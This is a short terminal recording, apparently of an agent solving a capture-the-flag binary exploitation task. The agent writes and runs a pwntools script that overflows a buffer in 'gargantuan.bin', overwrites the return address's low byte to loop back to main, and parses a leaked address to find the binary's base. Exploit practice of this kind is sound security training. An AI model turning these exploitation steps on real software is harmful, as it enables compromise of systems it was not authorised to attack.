[62.132517, "o", "\u001b[?2004hroot@d4684ace53f5:/app# "]
[78.828924, "i", "cat << 'EOF' > /app/pwn.py\nfrom pwn import *\n\ncontext.binary = elf = ELF('/app/gargantuan.bin')\nlibc = ELF('/app/libc.so.6')\n\np = process('/app/gargantuan.bin')\n\n# Phase 1: Overwrite LSB of RIP to return to main (0x12d9)\ntotal_padding = 0x528\npayload1 = b'\\x00' * total_padding + b'\\xd9'\n\n# We have 5 reads of 0x200 bytes. We can just send 5 chunks of 0x200, \n# or send chunks of 0x200 until we fill it.\nCHUNK_SIZE = 0x200\nfor i in range(5):\n    size_to_send = min(CHUNK_SIZE, len(payload1))\n    if size_to_send > 0:\n        chunk = payload1[:size_to_send]\n        payload1 = payload1[size_to_send:]\n        # pad chunk to CHUNK_SIZE if it's less, no wait, we can just send size_to_send.\n        # actually `read` might just return early. But to be safe, pad to 512.\n        chunk = chunk.ljust(CHUNK_SIZE, b'\\x00')\n        p.send(chunk)\n    else:\n        p.send(b'A' * CHUNK_SIZE)\n\n# Receive the leak\np.recvuntil(b'OO LATE! ')\nleak = int(p.recvline().strip(), 16)\nprint(f\"Leak: {hex(leak)}\")\nelf.address = leak - elf.symbols['gargantuan']\nprint(f\"ELF Base: {hex(elf.address)}\")\n\np.interactive()\nEOF\npython3 /app/pwn.py\n"]
